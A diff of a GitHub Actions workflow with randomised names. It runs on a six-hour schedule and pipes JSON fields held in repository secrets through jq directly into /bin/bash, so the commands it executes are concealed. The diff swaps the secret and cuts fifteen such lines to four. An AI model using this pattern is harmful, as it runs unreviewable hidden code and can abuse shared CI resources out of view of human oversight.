@@ -1,32 +1,19 @@
 name: yingongfei2389
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 0/6 * * *'
+    - cron: '15 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yingongfei2389
         env:
-          qpk41: ${{ secrets.qpk41 }}
+          kzfl76: ${{ secrets.kzfl76 }}
         run: |
-          echo $qpk41 | jq -r .e90002 | /bin/bash
-          echo $u2 | jq -r .ox0 | /bin/bash
-          echo $kvq1965 | jq -r .dz42 | /bin/bash
-          echo $lubm4 | jq -r .ofk76 | /bin/bash
-          echo $tutl9670 | jq -r .ptc03 | /bin/bash
-          echo $dqoc275 | jq -r .bic3953 | /bin/bash
-          echo $bxyw7691 | jq -r .oi5050 | /bin/bash
-          echo $tgqg61769 | jq -r .qfw24869 | /bin/bash
-          echo $jfba9243 | jq -r .qsll50 | /bin/bash
-          echo $kjgsc1044 | jq -r .mmlp8969 | /bin/bash
-          echo $p778 | jq -r .ctk990 | /bin/bash
-          echo $yzj2 | jq -r .vryp4153 | /bin/bash
-          echo $f341 | jq -r .hfo4988 | /bin/bash
-          echo $gr6 | jq -r .vxh00872 | /bin/bash
-          echo $zmg621 | jq -r .ewl039 | /bin/bash
+          echo $kzfl76 | jq -r .lf8 | /bin/bash
+          echo $i6 | jq -r .gjb42227 | /bin/bash
+          echo $i20 | jq -r .wml986 | /bin/bash
+          echo $km8417 | jq -r .g8913 | /bin/bash
 
